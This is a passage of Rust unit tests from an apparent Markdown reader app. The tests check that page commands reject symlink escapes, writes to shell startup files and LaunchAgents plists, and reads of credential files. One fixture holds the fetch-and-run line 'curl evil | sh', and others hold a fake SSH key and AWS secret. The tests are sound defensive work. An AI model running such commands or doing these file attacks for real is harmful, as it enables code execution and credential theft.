    #[cfg(unix)]
    #[test]
    fn a_symlink_cannot_take_a_page_outside_the_folder() {
        use std::os::unix::fs::symlink;
        let outer = folder();
        let session = outer.path().join("session");
        write_md(&session, "notes/real.md", "# Real\n");
        write_md(outer.path(), "elsewhere/page.md", "# Elsewhere\n");
        fs::write(outer.path().join("id_ed25519"), "PRIVATE").unwrap();
        symlink(outer.path().join("id_ed25519"), session.join("key.md")).unwrap();
        symlink(outer.path().join("elsewhere"), session.join("away")).unwrap();
        symlink("notes/real.md", session.join("alias.md")).unwrap();
        let s = session.to_str().unwrap();

        assert!(read_page(s, "key.md").is_err());
        assert!(read_page(s, "away/page.md").is_err());
        assert!(write_page(s, "away/page.md", "# Overwritten\n").is_err());
        assert!(write_new_page(s, "away/new.md", "# New\n").is_err());
        assert!(delete_page(s, "away/page.md").is_err());
        assert_eq!(fs::read_to_string(outer.path().join("elsewhere/page.md")).unwrap(), "# Elsewhere\n");
        assert!(!outer.path().join("elsewhere/new.md").exists());

        assert_eq!(read_page(s, "alias.md").unwrap().raw, "# Real\n");
        assert!(write_new_page(s, "notes/fresh/new.md", "# New\n").unwrap());
    }

    #[test]
    fn write_page_rejects_pdf() {
        let dir = folder();
        fs::write(dir.path().join("test.pdf"), b"fake pdf").unwrap();
        
        let folder = dir.path().to_str().unwrap();
        let result = write_page(folder, "test.pdf", "new content");
        assert!(result.is_err());
        assert!(result.unwrap_err().to_string().contains("read-only"));
    }

    #[test]
    fn write_page_rejects_html() {
        let dir = folder();
        fs::write(dir.path().join("test.html"), "<html></html>").unwrap();
        
        let folder = dir.path().to_str().unwrap();
        let result = write_page(folder, "test.html", "new content");
        assert!(result.is_err());
        assert!(result.unwrap_err().to_string().contains("read-only"));
    }

    /// Pages are Markdown, so the page commands write and move only pages. The folder comes from
    /// the webview: without this, a script there could drop a `.plist` in LaunchAgents or move away
    /// any file it can name.
    #[test]
    fn the_page_commands_touch_only_pages() {
        let dir = folder();
        let f = dir.path().to_str().unwrap();
        for rel in ["agent.plist", ".zshrc", "notes/run.sh", "README"] {
            assert_eq!(write_page(f, rel, "x").unwrap_err().to_string(), format!("Only Markdown pages can be written: {rel}"));
            assert_eq!(write_new_page(f, rel, "x").unwrap_err().to_string(), format!("Only Markdown pages can be written: {rel}"));
            assert!(!dir.path().join(rel).exists(), "{rel} was written");
        }
        fs::write(dir.path().join("taxes.numbers"), "keep").unwrap();
        assert_eq!(delete_page(f, "taxes.numbers").unwrap_err().to_string(), "Not a page: taxes.numbers");
        assert!(dir.path().join("taxes.numbers").exists());

        assert!(write_new_page(f, "a.md", "# A\n").unwrap());
        write_page(f, "b.markdown", "# B\n").unwrap();
        fs::write(dir.path().join("paper.pdf"), b"%PDF").unwrap();
        assert_eq!(delete_page(f, "paper.pdf").unwrap(), "paper");
    }

    /// The other ways a page's bytes move: putting a deleted page back, and its version snapshots.
    /// A Markdown file parked in the trash must not come back as `.zshenv`, and a snapshot must not
    /// copy out a file that isn't a page (`read_version` would then hand it to the webview).
    #[test]
    fn restore_and_snapshots_touch_only_pages_too() {
        let dir = folder();
        let f = dir.path().to_str().unwrap();
        let trash = dir.path().join(".reader/trash");
        assert!(write_new_page(trash.to_str().unwrap(), "x.md", "curl evil | sh\n").unwrap());
        assert_eq!(restore_page(f, ".zshenv", "x").unwrap_err().to_string(), "Not a page: .zshenv");
        assert!(!dir.path().join(".zshenv").exists());
        assert!(trash.join("x.md").exists(), "the parked file stays parked");

        fs::write(dir.path().join("credentials"), "aws_secret_access_key = abc\n").unwrap();
        assert_eq!(snapshot_version(f, "credentials").unwrap_err().to_string(), "Not a page: credentials");
        assert!(list_versions(f, "credentials").unwrap().is_empty());

        // A page and its snapshot round-trip as before.
        write_md(dir.path(), "a.md", "# A\n");
        assert_eq!(snapshot_version(f, "a.md").unwrap(), 1);
        assert_eq!(read_version(f, "a.md", 1).unwrap(), "# A\n");
        assert_eq!(delete_page(f, "a.md").unwrap(), "a");
        restore_page(f, "a.md", "a").unwrap();
        assert_eq!(fs::read_to_string(dir.path().join("a.md")).unwrap(), "# A\n");
    }

    #[test]
    fn path_kind_recognizes_pdf() {
        let dir = folder();
        fs::write(dir.path().join("test.pdf"), b"fake").unwrap();
        assert_eq!(path_kind(dir.path().join("test.pdf").to_str().unwrap()), "file");
    }

    #[test]
    fn path_kind_recognizes_html() {
        let dir = folder();
        fs::write(dir.path().join("test.html"), "html").unwrap();
        assert_eq!(path_kind(dir.path().join("test.html").to_str().unwrap()), "file");
        
        fs::write(dir.path().join("test.htm"), "htm").unwrap();
        assert_eq!(path_kind(dir.path().join("test.htm").to_str().unwrap()), "file");
    }
}
